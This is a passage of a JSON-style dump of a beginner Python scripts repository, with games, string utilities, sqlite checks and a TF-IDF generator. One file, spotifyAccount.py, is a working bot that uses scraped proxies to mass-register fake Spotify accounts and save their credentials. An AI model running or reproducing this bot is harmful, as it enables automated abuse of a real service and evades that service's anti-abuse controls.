sum_of_primes += i\n#    return sum_of_primes\n\n\n# if __name__ == \"__main__\":\n#    # import doctest\n#    # doctest.testmod()\n#    print(prime_sum(int(input().strip())))\n#    print(solution(int(input().strip())))\n"
        },
        {
          "name": "soundex_algorithm.py",
          "type": "blob",
          "size": 1.2275390625,
          "content": "def soundex_al(word):\n    cap_word = word.upper()  # convert the word to uppercase\n\n    return_val = \"\"\n    return_val = \"\" + cap_word[0]  # get the first letter of the word\n\n    # dictonary to give values to the letters\n    code_dict = {\"BFPV\": \"1\", \"CGJKQSXZ\": \"2\", \"DT\": \"3\", \"L\": \"4\", \"MN\": \"5\", \"R\": \"6\"}\n\n    # array of charactors to remove from the word\n    rem_charactors = [\"A\", \"E\", \"I\", \"O\", \"U\", \"H\", \"W\", \"Y\"]\n\n    # for loop to remove all the 0 valued charactors\n    temp = \"\"\n    for char in cap_word[1:]:\n        if char not in rem_charactors:\n            temp = temp + char\n\n    # get the values from the 'code_dict' and create the soundex code\n    for char in temp:\n        for key in code_dict.keys():\n            if char in key:\n                code = code_dict[key]\n                if code != return_val[-1]:  # Remove all pairs of consecutive digits.\n                    return_val += code\n\n    return_val = return_val[:4]  # crop the word to 4 charactors\n\n    # if soundex code doen't contain 4 digits. fill it with zeros\n    if len(return_val) < 4:\n        for x in range(len(return_val), 4):\n            return_val = return_val + \"0\"\n\n    # return the value\n    return return_val\n\n\n# testing the fucntion\nprint(soundex_al(\"Danus\"))\n"
        },
        {
          "name": "spiralmatrix.py",
          "type": "blob",
          "size": 0.7158203125,
          "content": "n = int(input(\"Enter the size of matrix:\"))\nt = 1\nr = 0  # r stands for row\nc = 0  # c stands for column\nmatrix = [[0 for x in range(n)] for y in range(n)]  # to initialise the matrix\nif n % 2 == 0:\n    k = n // 2\nelse:\n    k = int((n / 2) + 1)\nfor i in range(k):\n    while c < n:\n        matrix[r][c] = t\n        t = t + 1\n        c = c + 1\n    r = r + 1\n    c = c - 1\n    while r < n:\n        matrix[r][c] = t\n        t = t + 1\n        r = r + 1\n    r = r - 1\n    c = c - 1\n    while c >= i:\n        matrix[r][c] = t\n        c = c - 1\n        t = t + 1\n    c = c + 1\n    r = r - 1\n    while r > i:\n        matrix[r][c] = t\n        t = t + 1\n        r = r - 1\n    r = r + 1\n    n = n - 1\n    c = c + 1\nfor m in matrix:\n    print(m)\n"
        },
        {
          "name": "spotifyAccount.py",
          "type": "blob",
          "size": 3.1923828125,
          "content": "import platform\nimport random\nimport string\nimport threading\nimport time\nfrom os import system\n\nimport requests\n\nif platform.system() == \"Windows\":  # checking OS\n    title = \"windows\"\nelse:\n    title = \"linux\"\n\n\ndef randomName(size=10, chars=string.ascii_letters + string.digits):\n    return \"\".join(random.choice(chars) for i in range(size))\n\n\ndef randomPassword(size=14, chars=string.ascii_letters + string.digits):\n    return \"\".join(random.choice(chars) for i in range(size))\n\n\nglobal maxi\nglobal created\n\ncreated = 0\nerrors = 0\n\n\nclass proxy:\n    def update(self):\n        while True:\n\n            data = \"\"\n            urls = [\n                \"https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&ssl=yes\"\n            ]\n            for url in urls:\n                data += requests.get(url).text\n                self.splited += data.split(\"\\r\\n\")  # scraping and splitting proxies\n            time.sleep(600)\n\n    def get_proxy(self):\n        random1 = random.choice(self.splited)  # choose a random proxie\n        return random1\n\n    def FormatProxy(self):\n        proxyOutput = {\"https\": \"socks4://\" + self.get_proxy()}\n        return proxyOutput\n\n    def __init__(self):\n        self.splited = []\n        threading.Thread(target=self.update).start()\n        time.sleep(3)\n\n\nproxy1 = proxy()\n\n\ndef creator():\n    global maxi\n    global created\n    global errors\n    while maxi > created:\n        if title == \"windows\":\n            system(\n                \"title \"\n                + f\"Spotify Account Creator by KevinLage https://github.com/KevinLage/Spotify-Account-Creator Created: {created}/{maxi} Errors:{errors}\"\n            )\n\n        s = requests.session()\n\n        email = randomName()\n        password = randomPassword()\n\n        data = {\n            \"displayname\": \"Josh\",\n            \"creation_point\": \"https://login.app.spotify.com?utm_source=spotify&utm_medium=desktop-win32&utm_campaign=organic\",\n            \"birth_month\": \"12\",\n            \"email\": email + \"@gmail.com\",\n            \"password\": password,\n            \"creation_flow\": \"desktop\",\n            \"platform\": \"desktop\",\n            \"birth_year\": \"1991\",\n            \"iagree\": \"1\",\n            \"key\": \"4c7a36d5260abca4af282779720cf631\",\n            \"birth_day\": \"17\",\n            \"gender\": \"male\",\n            \"password_repeat\": password,\n            \"referrer\": \"\",\n        }\n\n        try:\n\n            r = s.post(\n                \"https://spclient.wg.spotify.com/signup/public/v1/account/\",\n                data=data,\n                proxies=proxy1.FormatProxy(),\n            )\n            if '{\"status\":1,\"' in r.text:\n                open(\"created.txt\", \"a+\").write(email + \"@gmail.com:\" + password + \"\\n\")\n                created += 1\n                if title == \"windows\":\n                    system(\n                        \"title \"\n                        + f\"Spotify Account Creator : {created}/{maxi} Errors:{errors}\"\n                    )\n            else:\n                errors += 1\n        except:\n            pass\n\n\nmaxi = int(input(\"How many accounts do you want to create?\\n\"))\n\nmaxthreads = int(input(\"How many Threads?\\n\"))\nnum = 0\n\nwhile num < maxthreads:\n    num += 1\n    threading.Thread(target=creator).start()  # Start Checking Thread\n"
        },
        {
          "name": "sqlite_check.py",
          "type": "blob",
          "size": 1.083984375,
          "content": "from __future__ import print_function\r\n\r\nimport os\r\nimport sqlite3 as lite\r\nimport sys\r\n\r\n# Script Name\t: sqlite_check.py\r\n# Author\t\t: Craig Richards\r\n# Created\t\t: 20 May 2013\r\n# Last Modified\t:\r\n# Version\t\t: 1.0\r\n# Modifications\t:\r\n# Description\t: Runs checks to check my SQLITE database\r\n\r\ndropbox = os.getenv(\"dropbox\")\r\ndbfile = \"Databases\\jarvis.db\"\r\nmaster_db = os.path.join(dropbox, dbfile)\r\ncon = None\r\n\r\ntry:\r\n    con = lite.connect(master_db)\r\n    cur = con.cursor()\r\n    cur.execute(\"SELECT SQLITE_VERSION()\")\r\n    data = cur.fetchone()\r\n    print(\"SQLite version: %s\" % data)\r\n\r\n\r\nexcept lite.Error as e:\r\n\r\n    print(\"Error %s:\" % e.args[0])\r\n    sys.exit(1)\r\n\r\nfinally:\r\n\r\n    if con:\r\n        con.close()\r\n\r\ncon = lite.connect(master_db)\r\ncur = con.cursor()\r\ncur.execute(\"SELECT name FROM sqlite_master WHERE type='table'\")\r\nrows = cur.fetchall()\r\nfor row in rows:\r\n    print(row)\r\n\r\ncon = lite.connect(master_db)\r\ncur = con.cursor()\r\ncur.execute(\"SELECT name FROM sqlite_master WHERE type='table'\")\r\nwhile True:\r\n    row = cur.fetchone()\r\n    if row == None:\r\n        break\r\n    print(row[0])\r\n"
        },
        {
          "name": "sqlite_table_check.py",
          "type": "blob",
          "size": 1.3271484375,
          "content": "# Script Name\t: sqlite_table_check.py\r\n# Author\t\t: Craig Richards\r\n# Created\t\t: 07 June 2013\r\n# Last Modified\t:\r\n# Version\t\t: 1.0\r\n\r\n# Modifications\t:\r\n\r\n# Description\t: Checks the main SQLITE database to ensure all the tables should exist\r\n\r\n\r\nimport os\r\nimport sqlite3\r\n\r\ndropbox = os.getenv(\"dropbox\")\r\nconfig = os.getenv(\"my_config\")\r\ndbfile = \"Databases\\jarvis.db\"\r\nlistfile = \"sqlite_master_table.lst\"\r\nmaster_db = os.path.join(dropbox, dbfile)\r\nconfig_file = os.path.join(config, listfile)\r\ntablelist = open(config_file, \"r\")\r\n\r\nconn = sqlite3.connect(master_db)\r\ncursor = conn.cursor()\r\ncursor.execute(\"SELECT SQLITE_VERSION()\")\r\ndata = cursor.fetchone()\r\n\r\nif str(data) == \"(u'3.6.21',)\":\r\n    print(\"\\nCurrently \" + master_db + \" is on SQLite version: %s\" % data + \" - OK -\\n\")\r\nelse:\r\n    print(\"\\nDB On different version than master version - !!!!! \\n\")\r\nconn.close()\r\n\r\nprint(\"\\nCheckling \" + master_db + \" against \" + config_file + \"\\n\")\r\n\r\nfor table in tablelist.readlines():\r\n    conn = sqlite3.connect(master_db)\r\n    cursor = conn.cursor()\r\n    cursor.execute(\r\n        \"select count(*) from sqlite_master where name = ?\", (table.strip(),)\r\n    )\r\n    res = cursor.fetchone()\r\n\r\n    if res[0]:\r\n        print(\"[+] Table : \" + table.strip() + \" exists [+]\")\r\n    else:\r\n        print(\"[-] Table : \" + table.strip() + \"  does not exist [-]\")\r\n"
        },
        {
          "name": "stack.py",
          "type": "blob",
          "size": 1.23828125,
          "content": "# Python program to reverse a string using stack\n\n# Function to create an empty stack.\n# It initializes size of stack as 0\ndef createStack():\n    stack = []\n    return stack\n\n\n# Function to determine the size of the stack\ndef size(stack):\n    return len(stack)\n\n\n# Stack is empty if the size is 0\ndef isEmpty(stack):\n    if size(stack) == 0:\n        return True\n\n\n# Function to add an item to stack .\n# It increases size by 1\ndef push(stack, item):\n    stack.append(item)\n\n\n# Function to remove an item from stack.\n# It decreases size by 1\ndef pop(stack):\n    if isEmpty(stack):\n        return\n    return stack.pop()\n\n\n# A stack based function to reverse a string\ndef reverse(string):\n    n = len(string)\n\n    # Create a empty stack\n    stack = createStack()\n\n    # Push all characters of string to stack\n    for i in range(0, n, 1):\n        push(stack, string[i])\n\n    # Making the string empty since all\n    # characters are saved in stack\n    string = \"\"\n\n    # Pop all characters of string and\n    # put them back to string\n    for i in range(0, n, 1):\n        string += pop(stack)\n\n    return string\n\n\n# Driver program to test above functions\nstring = \"GeeksQuiz\"\nstring = reverse(string)\nprint(\"Reversed string is \" + string)\n\n# This code is contributed by Yash\n"
        },
        {
          "name": "stackF_Harsh2255.py",
          "type": "blob",
          "size": 1.0224609375,
          "content": "# Python program for implementation of stack\n\n# import maxsize from sys module\n# Used to return -infinite when stack is empty\nfrom sys import maxsize\n\n# Function to create a stack. It initializes size of stack as 0\ndef createStack():\n    stack = []\n    return stack\n\n\n# Stack is empty when stack size is 0\ndef isEmpty(stack):\n    return len(stack) == 0\n\n\n# Function to add an item to stack. It increases size by 1\ndef push(stack, item):\n    stack.append(item)\n    print(item + \" pushed to stack \")\n\n\n# Function to remove an item from stack. It decreases size by 1\ndef pop(stack):\n    if isEmpty(stack):\n        return str(-maxsize - 1)  # return minus infinite\n\n    return stack.pop()\n\n\n# Function to return the top from stack without removing it\ndef peek(stack):\n    if isEmpty(stack):\n        return str(-maxsize - 1)  # return minus infinite\n    return stack[len(stack) - 1]\n\n\n# Driver program to test above functions\nstack = createStack()\npush(stack, str(10))\npush(stack, str(20))\npush(stack, str(30))\nprint(pop(stack) + \" popped from stack\")\n"
        },
        {
          "name": "stone_paper_scissor",
          "type": "tree",
          "content": null
        },
        {
          "name": "string_rotation.py",
          "type": "blob",
          "size": 0.5361328125,
          "content": "# This program rotates a given string letters by letters\n# for example:\n# input: \"Tie\"\n# Output: [\"ieT\", \"eTi\"]\n\n\ndef rotate(n):\n    a = list(n)\n    if len(a) == 0:\n        return print([])\n    l = []\n    for i in range(1, len(a) + 1):\n        a = [a[(i + 1) % (len(a))] for i in range(0, len(a))]\n        l += [\"\".join(a)]\n    print(l)\n\n\nstring = str(input())\nprint(\"Your input is :\", string)\nprint(\"The rotation is :\")\nrotate(string)\n\n\n# Input : Python\n# output :\n# The rotation is :\n# ['ythonp', 'thonpy', 'honpyt', 'onpyth', 'npytho', 'python']\n"
        },
        {
          "name": "sudoku.py",
          "type": "blob",
          "size": 1.82421875,
          "content": "board = [\r\n    [7, 8, 0, 4, 0, 0, 1, 2, 0],\r\n    [6, 0, 0, 0, 7, 5, 0, 0, 9],\r\n    [0, 0, 0, 6, 0, 1, 0, 7, 8],\r\n    [0, 0, 7, 0, 4, 0, 2, 6, 0],\r\n    [0, 0, 1, 0, 5, 0, 9, 3, 0],\r\n    [9, 0, 4, 0, 6, 0, 0, 0, 5],\r\n    [0, 7, 0, 3, 0, 0, 0, 1, 2],\r\n    [1, 2, 0, 0, 0, 7, 4, 0, 0],\r\n    [0, 4, 9, 2, 0, 6, 0, 0, 7],\r\n]\r\n\r\n\r\ndef solve(bo):\r\n    find = find_empty(bo)\r\n    if not find:\r\n        return True\r\n    else:\r\n        row, col = find\r\n\r\n    for i in range(1, 10):\r\n        if valid(bo, i, (row, col)):\r\n            bo[row][col] = i\r\n\r\n            if solve(bo):\r\n                return True\r\n\r\n            bo[row][col] = 0\r\n\r\n    return False\r\n\r\n\r\ndef valid(bo, num, pos):\r\n    # Check row\r\n    for i in range(len(bo[0])):\r\n        if bo[pos[0]][i] == num and pos[1] != i:\r\n            return False\r\n\r\n    # Check column\r\n    for i in range(len(bo)):\r\n        if bo[i][pos[1]] == num and pos[0] != i:\r\n            return False\r\n\r\n    # Check box\r\n    box_x = pos[1] // 3\r\n    box_y = pos[0] // 3\r\n\r\n    for i in range(box_y * 3, box_y * 3 + 3):\r\n        for j in range(box_x * 3, box_x * 3 + 3):\r\n            if bo[i][j] == num and (i, j) != pos:\r\n                return False\r\n\r\n    return True\r\n\r\n\r\ndef print_board(bo):\r\n    for i in range(len(bo)):\r\n        if i % 3 == 0 and i != 0:\r\n            print(\"- - - - - - - - - - - - - \")\r\n\r\n        for j in range(len(bo[0])):\r\n            if j % 3 == 0 and j != 0:\r\n                print(\" | \", end=\"\")\r\n\r\n            if j == 8:\r\n                print(bo[i][j])\r\n            else:\r\n                print(str(bo[i][j]) + \" \", end=\"\")\r\n\r\n\r\ndef find_empty(bo):\r\n    for i in range(len(bo)):\r\n        for j in range(len(bo[0])):\r\n            if bo[i][j] == 0:\r\n                return (i, j)  # row, col\r\n\r\n    return None\r\n\r\n\r\nprint_board(board)\r\nsolve(board)\r\nprint(\"_________________________\")\r\nprint_board(board)\r\n"
        },
        {
          "name": "sum_of_digits_of_a_number.py",
          "type": "blob",
          "size": 0.6484375,
          "content": "import sys\n\ndef get_integer_input(prompt, attempts):\n    for i in range(attempts, 0, -1):\n        try:\n            n = int(input(prompt))\n            return n\n        except ValueError:\n            print(\"Enter an integer only\")\n            print(f\"{i-1} {'chance' if i-1 == 1 else 'chances'} left\")\n    return None\n\ndef sum_of_digits(n):\n    total = 0\n    while n > 0:\n        total += n % 10\n        n //= 10\n    return total\n\nchances = 3\nnumber = get_integer_input(\"Enter a number: \", chances)\n\nif number is None:\n    print(\"You've used all your chances.\")\n    sys.exit()\n\nresult = sum_of_digits(number)\nprint(f\"The sum of the digits of {number} is: {result}\")\n"
        },
        {
          "name": "swap.py",
          "type": "blob",
          "size": 1.966796875,
          "content": "class Swapper:\n    \"\"\"\n    A class to perform swapping of two values.\n\n    Methods:\n    -------\n    swap_tuple_unpacking(self):\n        Swaps the values of x and y using a tuple unpacking method.\n    \n    swap_temp_variable(self):\n        Swaps the values of x and y using a temporary variable.\n    \n    swap_arithmetic_operations(self):\n        Swaps the values of x and y using arithmetic operations.\n\n    \"\"\"\n\n    def __init__(self, x, y):\n        \"\"\"\n        Initialize the Swapper class with two values.\n\n        Parameters:\n        ----------\n        x : int\n            The first value to be swapped.\n        y : int\n            The second value to be swapped.\n\n        \"\"\"\n        if not isinstance(x, (int, float)) or not isinstance(y, (float, int)):\n            raise ValueError(\"Both x and y should be integers.\")\n        \n        self.x = x\n        self.y = y\n\n    def display_values(self, message):\n        print(f\"{message} x: {self.x}, y: {self.y}\")\n\n    def swap_tuple_unpacking(self):\n        \"\"\"\n        Swaps the values of x and y using a tuple unpacking method.\n\n        \"\"\"\n        self.display_values(\"Before swapping\")\n        self.x, self.y = self.y, self.x\n        self.display_values(\"After swapping\")\n\n    def swap_temp_variable(self):\n        \"\"\"\n        Swaps the values of x and y using a temporary variable.\n\n        \"\"\"\n        self.display_values(\"Before swapping\")\n        temp = self.x\n        self.x = self.y\n        self.y = temp\n        self.display_values(\"After swapping\")\n\n    def swap_arithmetic_operations(self):\n        \"\"\"\n        Swaps the values of x and y using arithmetic operations.\n\n        \"\"\"\n        self.display_values(\"Before swapping\")\n        self.x = self.x - self.y\n        self.y = self.x + self.y\n        self.x = self.y - self.x\n        self.display_values(\"After swapping\")\n\n\nprint(\"Example 1:\")\nswapper1 = Swapper(5, 10)\nswapper1.swap_tuple_unpacking()\nprint()\n\nprint(\"Example 2:\")\nswapper2 = Swapper(100, 200)\nswapper2.swap_temp_variable()\nprint()\n"
        },
        {
          "name": "swapping of two numbers",
          "type": "blob",
          "size": 0.0009765625,
          "content": "\n"
        },
        {
          "name": "test.cpp",
          "type": "blob",
          "size": 0.0009765625,
          "content": "\n"
        },
        {
          "name": "testlines.py",
          "type": "blob",
          "size": 0.435546875,
          "content": "# Script Name\t\t: testlines.py\n# Author\t\t: Craig Richards\n# Created\t\t: 08th December 2011\n# Last Modified\t\t:\n# Version\t\t: 1.0\n\n# Modifications\t\t: beven nyamande\n\n# Description\t\t: This is a very simple script that opens up a file and writes whatever is set \"\n\n\ndef write_to_file(filename, txt):\n    with open(filename, \"w\") as file_object:\n        s = file_object.write(txt)\n\n\nif __name__ == \"__main__\":\n    write_to_file(\"test.txt\", \"I am beven\")\n"
        },
        {
          "name": "text to speech",
          "type": "blob",
          "size": 0.3486328125,
          "content": "pip install gTTS\n#importing the gTTS library\nfrom gtts import gTTS\n#Asking the user for the required text\nmt = input(\"Enter the required text:\\t\")\n#Setting the output language\nlanguage = ‘en’\n#Converting text to speech and choosing speed as fast\nvoice = gTTS(text=mt, lang=language, slow=False)\n#Saving the speech as mp3 file\nvoice.save(“conv.mp3”)\n"
        },
        {
          "name": "text-to-audio",
          "type": "tree",
          "content": null
        },
        {
          "name": "text_file_replace.py",
          "type": "blob",
          "size": 1.279296875,
          "content": "\"\"\"\nAuthor:         Linjian Li (github.com/LinjianLi)\nCreated:        2020-04-09\nLast Modified:  2020-10-17\nDescription:    A script that replace specified text string in a text file.\nHow to use:     `-f` specifying the text file,\n                `-e` specifying the encoding (optional),\n                `-o` specifying the old text string to be replaced),\n                `-n` specifying the new text string to replace with.\n\"\"\"\n\n\ndef text_file_replace(file, encoding, old, new):\n    lines = []\n    cnt = 0\n    with open(file=file, mode=\"r\", encoding=encoding) as fd:\n        for line in fd:\n            cnt += line.count(old)\n            lines.append(line.replace(old, new))\n    with open(file=file, mode=\"w\", encoding=encoding) as fd:\n        fd.writelines(lines)\n    print('{} occurence(s) of \"{}\" have been replaced with \"{}\"'.format(cnt, old, new))\n    return cnt\n\n\nif __name__ == \"__main__\":\n    import argparse\n\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"-f\", \"--file\", help=\"File.\")\n    parser.add_argument(\"-e\", \"--encoding\", default=\"utf-8\", help=\"Encoding.\")\n    parser.add_argument(\"-o\", \"--old\", help=\"Old string.\")\n    parser.add_argument(\"-n\", \"--new\", help=\"New string.\")\n    args = parser.parse_args()\n\n    text_file_replace(args.file, args.encoding, args.old, args.new)\n"
        },
        {
          "name": "text_to_audio",
          "type": "tree",
          "content": null
        },
        {
          "name": "text_to_pig_latin.py",
          "type": "blob",
          "size": 1.1083984375,
          "content": "\"\"\"\nThis program converts English text to Pig-Latin. In Pig-Latin, we take the first letter of each word, \nmove it to the end, and add 'ay'. If the first letter is a vowel, we simply add 'hay' to the end. \nThe program preserves capitalization and title case.\n\nFor example:\n- \"Hello\" becomes \"Ellohay\"\n- \"Image\" becomes \"Imagehay\"\n- \"My name is John Smith\" becomes \"Ymay amenay ishay Ohnjay Mithsmay\"\n\"\"\"\n\n\ndef pig_latin_word(word):\n    vowels = \"AEIOUaeiou\"\n\n    if word[0] in vowels:\n        return word + \"hay\"\n    else:\n        return word[1:] + word[0] + \"ay\"\n\ndef pig_latin_sentence(text):\n    words = text.split()\n    pig_latin_words = []\n\n    for word in words:\n        # Preserve capitalization\n        if word.isupper():\n            pig_latin_words.append(pig_latin_word(word).upper())\n        elif word.istitle():\n            pig_latin_words.append(pig_latin_word(word).title())\n        else:\n            pig_latin_words.append(pig_latin_word(word))\n\n    return ' '.join(pig_latin_words)\n\nuser_input = input(\"Enter some English text: \")\npig_latin_text = pig_latin_sentence(user_input)\nprint(\"\\nPig-Latin: \" + pig_latin_text)\n"
        },
        {
          "name": "tf_idf_generator.py",
          "type": "blob",
          "size": 5.0908203125,
          "content": "\"\"\"@Author: Anurag Kumar(mailto:anuragkumarak95@gmail.com) \nThis module is used for generating a TF-IDF file or values from a list of files that contains docs.\n\nWhat is TF-IDF : https://en.wikipedia.org/wiki/Tf%E2%80%93idf\n\npython:\n  - 3.5\n\npre-requisites: \n  - colorama==0.3.9 \n\nsample file format of input:\n\n    ##START(NOT INCLUDED)\n    sport smile today because signs Gemini\n    little sister dealt severe allergy figure\n    about looks gender color attitude nationality respect\n    added video playlist Sonic Fightstick Edition\n    weeks birthday scott wants camping keeper\n    photo taking photo trying auction scale photo\n    happy creatively capture story stage magical\n    yoongi looks seokjin looking yoongi looking seokjin\n    taking glasses because buffering cannot handle\n    tried Michelle Obama proceeded defend whole pointless\n    robbed shades backstage reading guess karma stealing\n    remains sailors destroyer McCain collision found\n    timeline beginnings infographics Catch upcoming debut\n    ##END(NOT INCLUDED)\n\nhere, every line represents a document.\n\nhave fun, cheers.\n\"\"\"\nimport math\nimport pickle\n\nfrom colorama import Fore, Style\n\nswitcher = {\n    \"r\": Fore.RED,\n    \"bk\": Fore.BLACK,\n    \"b\": Fore.BLUE,\n    \"g\": Fore.GREEN,\n    \"y\": Fore.YELLOW,\n    \"m\": Fore.MAGENTA,\n    \"c\": Fore.CYAN,\n    \"w\": Fore.WHITE,\n}\n\n\ndef paint(str, color=\"r\"):\n    \"\"\"Utility func, for printing colorful logs in console...\n\n    @args:\n    --\n    str : String to be modified.\n    color : color code to which the string will be formed. default is 'r'=RED\n\n    @returns:\n    --\n    str : final modified string with foreground color as per parameters.\n\n    \"\"\"\n    if color in switcher:\n        str = switcher[color] + str + Style.RESET_ALL\n    return str\n\n\nTAG = paint(\"TF-IDF-GENE/\", \"b\")\n\n\ndef find_tf_idf(file_names=None, prev_file_path=None, dump_path=None):\n    \"\"\"Function to create a TF-IDF list of dictionaries for a corpus of docs.\n    If you opt for dumping the data, you can provide a file_path with .tfidfpkl extension(standard made for better understanding)\n    and also re-generate a new tfidf list which overrides over an old one by mentioning its path.\n\n    @Args:\n    --\n    file_names : paths of files to be processed on, you can give many small sized file, rather than one large file.\n    prev_file_path : path of old .tfidfpkl file, if available. (default=None)\n    dump_path : directory-path where to dump generated lists.(default=None)\n\n    @returns:\n    --\n    idf : a dict of unique words in corpus,with their document frequency as values.\n    tf_idf : the generated tf-idf list of dictionaries for mentioned docs.\n    \"\"\"\n    if file_names is None:\n        file_names = [\"./../test/testdata\"]\n    tf_idf = (\n        []\n    )  # will hold a dict of word_count for every doc(line in a doc in this case)\n    idf = {}\n\n    # this statement is useful for altering existant tf-idf file and adding new docs in itself.(## memory is now the biggest issue)\n    if prev_file_path:\n        print(TAG, \"modifying over exising file.. @\", prev_file_path)\n        idf, tf_idf = pickle.load(open(prev_file_path, \"rb\"))\n        prev_doc_count = len(idf)\n        prev_corpus_length = len(tf_idf)\n\n    for f in file_names:\n\n        file1 = open(\n            f, \"r\"\n        )  # never use 'rb' for textual data, it creates something like,  {b'line-inside-the-doc'}\n\n        # create word_count dict for all docs\n        for line in file1:\n            dict = {}\n            # find the amount of doc a word is in\n            for i in set(line.split()):\n                if i in idf:\n                    idf[i] += 1\n                else:\n                    idf[i] = 1\n            for word in line.split():\n                # find the count of all words in every doc\n                if word not in dict:\n                    dict[word] = 1\n                else:\n                    dict[word] += 1\n            tf_idf.append(dict)\n        file1.close()\n\n    # calculating final TF-IDF values  for all words in all docs(line in a doc in this case)\n    for doc in tf_idf:\n        for key in doc:\n            true_idf = math.log(len(tf_idf) / idf[key])\n            true_tf = doc[key] / len(doc)\n            doc[key] = true_tf * true_idf\n\n    # do not get overwhelmed, just for logging the quantity of words that have been processed.\n    print(\n        TAG,\n        \"Total number of unique words in corpus\",\n        len(idf),\n        \"( \" + paint(\"++\" + str(len(idf) - prev_doc_count), \"g\") + \" )\"\n        if prev_file_path\n        else \"\",\n    )\n    print(\n        TAG,\n        \"Total number of docs in corpus:\",\n        len(tf_idf),\n        \"( \" + paint(\"++\" + str(len(tf_idf) - prev_corpus_length), \"g\") + \" )\"\n        if prev_file_path\n        else \"\",\n    )\n\n    # dump if a dir-path is given\n    if dump_path:\n        if dump_path[-8:] != \"tfidfpkl\":\n            raise Exception(\n                TAG\n                + \"Please provide a .tfidfpkl file_path, it is the standard format of this module.\"\n            )\n        pickle.dump(\n            (idf, tf_idf), open(dump_path, \"wb\"), protocol=pickle.HIGHEST_PROTOCOL\n        )\n        print(TAG, \"Dumping TF-IDF vars @\", dump_path)\n    return idf, tf_idf\n"
        },
        {
          "name": "thired-party-haarcascade-mustache-on-face",
          "type": "tree",
          "content": null
        },
        {
          "name": "thread_signal.py",
          "type": "blob",
          "size": 0.775390625,
          "content": "from __future__ import print_function\n\nimport signal\nimport threading\nfrom time import sleep\n\n\nclass producer(threading.Thread):\n    def __init__(self, event):\n        threading.Thread.__init__(self)\n        self.event = event\n\n    def run(self):\n        while self.event.is_set():\n            print(\"sub thread\")\n            sleep(2)\n        else:\n            print(\"sub thread end\")\n            exit()\n\n\ndef handler_thread(event):\n    print(\"main thread end\")\n    event.clear()\n\n\ndef handler(signum, frame):\n    handler_thread(frame.f_globals[\"event\"])\n\n\nsignal.signal(signal.SIGINT, handler)\n\nprint(\"main thread\")\nevent = threading.Event()\nevent.set()\np = producer(event)\np.start()\np.join()\n\nsleep(100)  # 一定要使主线程处于活动状态，否则信号处理对子线程不起作用\n"
        },
        {
          "name": "tic-tac-toe.py",
          "type": "blob",
          "size": 2.6328125,
          "content": "import os\nimport time\n\nboard = [\" \", \" \", \" \", \" \", \" \", \" \", \" \", \" \", \" \", \" \"]\nplayer = 1\n\n########win Flags##########\nWin = 1\nDraw = -1\nRunning = 0\nStop = 1\n###########################\nGame = Running\nMark = \"X\"\n\n# This Function Draws Game Board\ndef DrawBoard():\n    print(\" %c | %c | %c \" % (board[1], board[2], board[3]))\n    print(\"___|___|___\")\n    print(\" %c | %c | %c \" % (board[4], board[5], board[6]))\n    print(\"___|___|___\")\n    print(\" %c | %c | %c \" % (board[7], board[8], board[9]))\n    print(\"   |   |   \")\n\n\n# This Function Checks position is empty or not\ndef CheckPosition(x):\n    if board[x] == \" \":\n        return True\n    else:\n        return False\n\n\n# This Function Checks player has won or not\ndef CheckWin():\n    global Game\n    # Horizontal winning condition\n    if board[1] == board[2] and board[2] == board[3] and board[1] != \" \":\n        Game = Win\n    elif board[4] == board[5] and board[5] == board[6] and board[4] != \" \":\n        Game = Win\n    elif board[7] == board[8] and board[8] == board[9] and board[7] != \" \":\n        Game = Win\n    # Vertical Winning Condition\n    elif board[1] == board[4] and board[4] == board[7] and board[1] != \" \":\n        Game = Win\n    elif board[2] == board[5] and board[5] == board[8] and board[2] != \" \":\n        Game = Win\n    elif board[3] == board[6] and board[6] == board[9] and board[3] != \" \":\n        Game = Win\n    # Diagonal Winning Condition\n    elif board[1] == board[5] and board[5] == board[9] and board[5] != \" \":\n        Game = Win\n    elif board[3] == board[5] and board[5] == board[7] and board[5] != \" \":\n        Game = Win\n    # Match Tie or Draw Condition\n    elif (\n        board[1] != \" \"\n        and board[2] != \" \"\n        and board[3] != \" \"\n        and board[4] != \" \"\n        and board[5] != \" \"\n        and board[6] != \" \"\n        and board[7] != \" \"\n        and board[8] != \" \"\n        and board[9] != \" \"\n    ):\n        Game = Draw\n    else:\n        Game = Running\n\n\nprint(\"Tic-Tac-Toe Game Designed By Sourabh Somani\")\nprint(\"Player 1 [X] --- Player 2 [O]\\n\")\nprint()\nprint()\nprint(\"Please Wait...\")\ntime.sleep(3)\nwhile Game == Running:\n    os.system(\"cls\")\n    DrawBoard()\n    if player % 2 != 0:\n        print(\"Player 1's chance\")\n        Mark = \"X\"\n    else:\n        print(\"Player 2's chance\")\n        Mark = \"O\"\n    choice = int(input(\"Enter the position between [1-9] where you want to mark : \"))\n    if CheckPosition(choice):\n        board[choice] = Mark\n        player += 1\n        CheckWin()\n\nos.system(\"cls\")\nDrawBoard()\nif Game == Draw:\n    print(\"Game Draw\")\nelif Game == Win:\n    player -= 1\n    if player % 2 != 0:\n        print(\"Player 1 Won\")\n    else:\n        print(\"Player 2 Won\")\n"
        },
        {
          "name": "tic_tak_toe.py",
          "type": "blob",
          "size": 2.5712890625,
          "content": "# Tic-Tac-Toe Program using\n# random number in Python\n\n# importing all necessary libraries\nimport numpy as np\nimport random\nfrom time import sleep\n\n# Creates an empty board\ndef create_board():\n    return np.array([[0, 0, 0], [0, 0, 0], [0, 0, 0]])\n\n\n# Check for empty places on board\ndef possibilities(board):\n    l = []\n\n    for i in range(len(board)):\n        for j in range(len(board)):\n\n            if board[i][j] == 0:\n                l.append((i, j))\n    return l\n\n\n# Select a random place for the player\ndef random_place(board, player):\n    selection = possibilities(board)\n    current_loc = random.choice(selection)\n    board[current_loc] = player\n    return board\n\n\n# Checks whether the player has three\n# of their marks in a horizontal row\ndef row_win(board, player):\n    for x in range(len(board)):\n        win = True\n\n        for y in range(len(board)):\n            if board[x, y] != player:\n                win = False\n                continue\n\n        if win == True:\n            return win\n    return win\n\n\n# Checks whether the player has three\n# of their marks in a vertical row\ndef col_win(board, player):\n    for x in range(len(board)):\n        win = True\n\n        for y in range(len(board)):\n            if board[y][x] != player:\n                win = False\n                continue\n\n        if win == True:\n            return win\n    return win\n\n\n# Checks whether the player has three\n# of their marks in a diagonal row\ndef diag_win(board, player):\n    win = True\n    y = 0\n    for x in range(len(board)):\n        if board[x, x] != player:\n            win = False\n    if win:\n        return win\n    win = True\n    if win:\n        for x in range(len(board)):\n            y = len(board) - 1 - x\n            if board[x, y] != player:\n                win = False\n    return win\n\n\n# Evaluates whether there is\n# a 